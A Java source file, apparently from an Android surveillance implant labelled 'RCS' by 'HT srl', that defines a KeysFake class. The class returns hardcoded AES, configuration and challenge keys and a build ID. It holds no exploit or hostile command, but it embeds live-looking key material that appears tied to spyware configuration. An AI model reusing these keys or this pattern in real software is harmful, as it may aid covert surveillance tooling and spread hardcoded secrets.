/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : KeysFake.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.crypto;

import com.android.service.util.Utils;

/**
 * The Class KeysFake.
 */
public class KeysFake extends Keys {
	
	 // RCS 851 su castore
	 byte[] AesKey = Utils.hexStringToByteArray("b2b257a3397eded7f1d22603d382771e409fc7943894273fec32c0c033a9e264",0,32);
	 byte[] ConfKey = Utils.hexStringToByteArray("5aeb530a5ece59bf02b39f3645dea775669acea92f9cac10b2a1680421d5e058",0,32);
	 byte[] ChallengeKey = Utils.hexStringToByteArray("572ebc94391281ccf53a851330bb0d992c237a0ffbb0c079281236da8ac5f462",0,32);
	 String BuildId = "RCS_0000000851";

	public KeysFake() {
		super(false);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getAesKey()
	 */
	@Override
	public byte[] getAesKey() {
		return AesKey;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getChallengeKey()
	 */
	@Override
	public byte[] getChallengeKey() {
		return ChallengeKey;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getConfKey()
	 */
	@Override
	public byte[] getConfKey() {
		return ConfKey;
	}
	
	/*
	 * public byte[] getInstanceId() { return g_InstanceId; }
	 */

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.crypto.Keys#getBuildId()
	 */
	@Override
	public byte[] getBuildId() {
		return BuildId.getBytes();
	}
}
